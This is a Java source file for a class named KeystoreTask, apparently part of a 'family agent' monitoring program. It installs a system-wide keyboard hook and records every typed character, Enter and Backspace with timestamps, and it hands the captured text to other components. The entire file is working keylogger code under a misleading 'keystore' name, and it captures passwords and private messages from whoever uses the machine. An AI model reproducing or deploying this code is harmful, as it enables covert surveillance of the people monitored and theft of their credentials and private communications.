package com.family.agent.collector;

import com.family.agent.model.KeystoreModel;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeystoreTask extends Thread implements NativeKeyListener {
	public volatile KeystoreModel lastFrame;
	
	private final StringBuilder buffer = new StringBuilder();
	private static final int MAX_BUFFER = 10000;
	
	public KeystoreTask()
	{
		
	}
	
	public void run()
	{
		try
		{
			lastFrame = new KeystoreModel("");
			GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(this);
			
			while(!isInterrupted())
			{
				try
				{
					Thread.sleep(500);
				}
				catch(Exception e)
				{
					interrupt();
				}
			}
			
		}
		catch(Exception e)
		{
			
		}
	}
	
	 @Override public void nativeKeyTyped(NativeKeyEvent e)
	 {
		 char ch = e.getKeyChar();
		 
		 if (!isPrintable(ch)) 
			 return;
		 
		 synchronized (buffer) 
		 {
			if(buffer.length() > MAX_BUFFER)
				resetData();
				
            buffer.append(ch);
            lastFrame.setText(buffer.toString());
            lastFrame.addKeyEvent(buffer.length() - 1, System.currentTimeMillis());
	     }
	 } 
	 @Override public void nativeKeyPressed(NativeKeyEvent e)
	 {
		 int code = e.getKeyCode();
		 if(code == NativeKeyEvent.VC_BACKSPACE)
		 {
			 if (buffer.length() > 0)
			 {
				 synchronized (buffer) 
				 {
					 buffer.setLength(buffer.length()-1);
					 lastFrame.setText(buffer.toString());
					 lastFrame.removeLastKeyEvent();
				 }
			 }
			 
		 }
		 else
			 if(code == NativeKeyEvent.VC_ENTER)
			 {
				 synchronized (buffer) 
				 {
					 buffer.append("\n");
					 lastFrame.setText(buffer.toString());
			         lastFrame.addKeyEvent(buffer.length() - 1, System.currentTimeMillis());
				 }			 
			 }
	 }
	 @Override public void nativeKeyReleased(NativeKeyEvent e) 
	 {
		 
	 }
	 
	 public void resetData()
	 {
		 synchronized (buffer) 
		 {
			buffer.setLength(0);
			lastFrame = new KeystoreModel("");
			lastFrame.resetKeyEvent();
		 }
	 }
	 
	 public KeystoreModel swapModel() 
	 {
        synchronized (buffer) 
        {
            KeystoreModel old = lastFrame;          
            lastFrame = new KeystoreModel("");   
            lastFrame.resetKeyEvent();
            buffer.setLength(0);                    
            return old;
        }
	 }
	 
	 public void stopKeystore()
	 {
		 try
		 {
			 interrupt();
			 GlobalScreen.unregisterNativeHook();
		 }
		 catch(Exception e)
		 {
			 
		 }
	 }
	 
	 private static boolean isPrintable(char ch)
	 {
		 if(ch == '\n' || ch == '\r' || ch == '\t')
			 return true;
		 
		 return ch != NativeKeyEvent.CHAR_UNDEFINED && !Character.isISOControl(ch);
	 }
}
